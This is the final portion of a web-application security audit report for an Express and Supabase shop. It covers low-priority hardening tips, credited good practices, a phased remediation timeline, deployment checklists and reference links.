### 17. **Add Security Headers** 🛡️ LOW
**Location:** [backend/server.js](backend/server.js#L1)

Use Helmet middleware (recommended above for HIGH priority).

---

### 18. **Implement API Request Logging** 📊 LOW
Log all API requests for monitoring:

```javascript
import morgan from 'morgan';

app.use(morgan(':remote-addr - :remote-user [:date[clf]] ":method :url HTTP/:http-version" :status :res[content-length] - :response-time ms'));
```

---

### 19. **Add Input Size Limits** 📦 LOW
**Location:** [backend/server.js](backend/server.js#L1)

```javascript
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));
```

---

### 20. **Missing .env File**  ⚠️ LOW
**Location:** Project root

Ensure `.env` is created from `.env.example`:
```bash
# .env (local development only)
NODE_ENV=development
PORT=3000
SUPABASE_URL=your_url
SUPABASE_SERVICE_ROLE_KEY=your_key
SUPABASE_JWT_SECRET=your_jwt_secret
FRONTEND_URL=http://localhost:5173
PAYPAL_MODE=sandbox
PAYPAL_CLIENT_ID=your_client_id
PAYPAL_CLIENT_SECRET=your_secret
BANK_ACCOUNT_NUMBER=not_in_code
BANK_CODE=not_in_code
```

---

## ✅ BEST PRACTICES BEING FOLLOWED

### Positive Security Measures:

1. ✅ **Uses Supabase Auth**: Leverages managed authentication service
2. ✅ **Anon Key for Frontend**: Doesn't expose service role key to frontend
3. ✅ **JWT Bearer Tokens**: Proper authorization header usage
4. ✅ **Environment Variables**: Secrets not hardcoded
5. ✅ **Basic Input Validation**: Present in order routes
6. ✅ **Authorization Checks**: Role-based access control implemented (with caveats)
7. ✅ **Structured Error Handling**: Try-catch blocks present
8. ✅ **HTTPS-Ready**: Can be configured for production
9. ✅ **.gitignore Configured**: Secrets properly ignored (after recent fix)
10. ✅ **TypeScript Types**: Not used but plan for future

---

## 🔧 IMPLEMENTATION PRIORITY & TIMELINE

### PHASE 1 - CRITICAL (Week 1)
**Must complete before production:**

1. ✅ Fix JWT verification in auth middleware
   - Time: 1-2 hours
   - Impact: Prevents authentication bypass

2. ✅ Implement CSRF protection
   - Time: 2-3 hours
   - Impact: Prevents state-changing attacks

3. ✅ Secure bank details handling
   - Time: 2-3 hours
   - Impact: Protects financial data

4. ✅ Verify PayPal webhooks
   - Time: 3-4 hours
   - Impact: Prevents payment fraud

5. ✅ Add environment variable validation
   - Time: 1 hour
   - Impact: Ensures secure config

### PHASE 2 - HIGH (Week 2)
**Complete before launching to production:**

1. Input validation with Zod
   - Time: 4-5 hours
   
2. Price verification in orders
   - Time: 2-3 hours
   
3. Admin authorization checks
   - Time: 2-3 hours
   
4. Add rate limiting
   - Time: 2-3 hours
   
5. Move admin operations to backend
   - Time: 4-6 hours
   
6. Add HTTPS enforcement
   - Time: 1-2 hours

### PHASE 3 - MEDIUM (Week 3-4)
**Implement before scaling:**

1. Input sanitization (DOMPurify)
   - Time: 2-3 hours
   
2. Audit logging system
   - Time: 4-5 hours
   
3. JWT to HTTP-Only cookies
   - Time: 3-4 hours
   
4. Stronger password requirements
   - Time: 1-2 hours
   
5. Race condition fix (transactions)
   - Time: 3-4 hours

### PHASE 4 - LOW (Ongoing)
**Continuous improvements:**

1. Security headers
2. Request logging
3. Input size limits
4. Additional monitoring

---

## 📋 SECURITY CHECKLIST FOR DEPLOYMENT

- [ ] JWT verification enabled with secret key
- [ ] CSRF tokens implemented on all state-changing endpoints
- [ ] Bank details never returned in API response
- [ ] PayPal webhooks verified with signature validation
- [ ] Input validation with Zod on all routes
- [ ] Rate limiting enabled on all endpoints
- [ ] Admin operations moved to backend API
- [ ] Authorization checks on all protected routes
- [ ] Price verification implemented before creating orders
- [ ] HTTPS enforced in production
- [ ] Security headers added (Helmet)
- [ ] Audit logging configured
- [ ] .env file created with all required variables
- [ ] Database RLS policies enabled
- [ ] CORS properly configured for production domains
- [ ] Secrets not exposed in frontend code
- [ ] XSS sanitization implemented
- [ ] Password validation meets standards
- [ ] Database transactions prevent race conditions
- [ ] Error handling doesn't leak sensitive info

---

## 🚀 DEPLOYMENT CHECKLIST

```bash
# 1. Environment Setup
cp .env.example .env
# Fill with production values

# 2. Install dependencies
npm install
cd backend && npm install && cd ..

# 3. Database setup
# - Create RLS policies
# - Create audit_logs table
# - Create stored procedures

# 4. Build frontend
npm run build

# 5. Test security
npm run lint
npm run test

# 6. Deploy backend
# - Set NODE_ENV=production
# - Configure ALLOWED_ORIGINS
# - Enable HTTPS redirect

# 7. Deploy frontend
# - Update VITE_BACKEND_URL
# - Configure VITE_SUPABASE_* keys

# 8. Monitor
# - Set up audit log monitoring
# - Configure error tracking (Sentry)
# - Enable access logs
```

---

## 📞 RECOMMENDATIONS FOR NEXT STEPS

1. **Immediate Action (24 hours)**
   - Fix JWT verification
   - Implement CSRF protection
   - Secure bank details
   - Validate PayPal webhooks

2. **Short-term (1 week)**
   - Complete all PHASE 1 & 2 items
   - Conduct security testing
   - Set up monitoring

3. **Medium-term (1 month)**
   - Implement PHASE 3 recommendations
   - Penetration testing
   - Security audit with professional firm

4. **Ongoing**
   - Keep dependencies updated
   - Monitor security advisories
   - Regular security reviews

---

## 📚 REFERENCES & RESOURCES

- [OWASP Top 10 2023](https://owasp.org/Top10/)
- [Supabase Security Best Practices](https://supabase.com/docs/guides/auth)
- [JWT.io](https://jwt.io/) - JWT debugging
- [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
- [Express.js Security](https://expressjs.com/en/advanced/best-practice-security.html)
- [React Security Best Practices](https://snyk.io/blog/10-react-security-best-practices/)
- [Helmet.js](https://helmetjs.github.io/) - Security headers
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

**Report Prepared By:** Security Audit Team  
**Status:** ⚠️ **ACTION REQUIRED** - Multiple critical vulnerabilities detected  
**Recommended Action:** Address PHASE 1 items before production deployment
